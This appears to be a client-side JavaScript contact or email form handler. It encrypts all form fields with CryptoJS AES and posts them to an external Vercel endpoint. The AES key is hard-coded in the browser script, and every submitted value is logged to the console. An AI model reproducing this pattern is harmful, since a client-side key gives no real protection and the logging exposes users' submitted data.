const btn = document.getElementById('submit'); // Get the submit button
const CryptoJS = require('crypto-js'); // Include crypto-js for encryption

// Shared secret key (in production, store securely and share via secure channel)
const SECRET_KEY = 'my-secret-key-1234567890123456'; // Must be 16, 24, or 32 bytes for AES

document.getElementById('form').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevent default form submission

  btn.value = 'Sending...';
  btn.disabled = true;

  // Collect form data into an object
  const formData = new FormData(this);
  const data = {};
  for (let [key, value] of formData.entries()) {
    data[key] = value.trim(); // Trim values
    console.log(`${key}: ${value}`);
  }

  // Encrypt the form data
  const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(data), SECRET_KEY).toString();

  // Send POST request with fetch
  fetch('https://insta-backend-lime-six.vercel.app/api/sendMail', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ encrypted: encryptedData }) // Send encrypted data
  })
    .then(async (response) => {
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(errorText || `HTTP ${response.status}`);
      }
      return response.json();
    })
    .then(result => {
      btn.value = 'Send Email';
      btn.disabled = false;
      alert('✅ Sent!');
      console.log('Success:', result);
    })
    .catch(error => {
      btn.value = 'Send Email';
      btn.disabled = false;
      alert('❌ Error: ' + error.message);
      console.error('Error:', error);
    });
});
